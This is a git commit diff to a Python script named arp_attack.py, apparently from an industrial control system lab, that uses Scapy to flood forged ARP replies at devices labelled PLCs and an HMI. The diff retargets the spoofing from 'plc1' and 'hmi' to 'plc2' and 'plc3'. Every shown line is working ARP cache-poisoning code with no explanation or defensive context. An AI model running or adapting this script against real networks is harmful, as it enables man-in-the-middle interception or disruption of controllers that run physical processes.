65927ed6ada9e95db88922de823e4b7bb2caa9fd
ndtung220103 <nguyendinhtung103664@gmail.com>
2025-05-15 14:12:11 +0700

    attack

--- arp_attack.py
+++ arp_attack.py
@@ -3,19 +3,19 @@ from scapy.all import *
 import time
 
 while True:
-    E = Ether(dst = '00:1D:9C:C7:B0:10', src = 'AA:AA:AA:AA:AA:AA')  
-    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C7:B0:10', pdst = '192.168.1.10')  
+    E = Ether(dst = '00:1D:9C:C8:BC:46', src = 'AA:AA:AA:AA:AA:AA')  
+    A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:46', pdst = '192.168.1.20')  
     
-    print(f"send a packet to plc1")
+    print(f"send a packet to plc2")
     pkt = E/A  
     sendp(pkt)
 
     
-    E1 = Ether(dst = '00:1D:9C:C8:BC:20', src = 'AA:AA:AA:AA:AA:AA')  
-    A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.10', hwdst = '00:1D:9C:C8:BC:20', pdst = '192.168.1.20')  
+    E1 = Ether(dst = '00:1D:9C:C8:BD:F2', src = 'AA:AA:AA:AA:AA:AA')  
+    A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.20', hwdst = '00:1D:9C:C8:BD:F2', pdst = '192.168.1.30')  
     
     pkt1 = E1/A1 
-    print(f"send a packet to hmi")
+    print(f"send a packet to plc3")
     sendp(pkt1)
     
 
